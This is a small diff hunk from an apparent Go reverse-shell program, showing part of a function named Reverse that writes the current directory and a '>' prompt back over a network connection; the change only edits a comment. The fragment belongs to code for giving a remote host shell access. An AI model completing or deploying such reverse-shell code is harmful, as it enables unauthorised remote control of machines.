@@ -27,7 +27,7 @@ func Reverse(host string,term string) {
 
 	r := bufio.NewReader(c)
 	for {
-		//Print path and > on the shell
+		//Print path on the shell
 		path, _ := os.Getwd()
 		c.Write([]byte(path))
 		c.Write([]byte(">"))
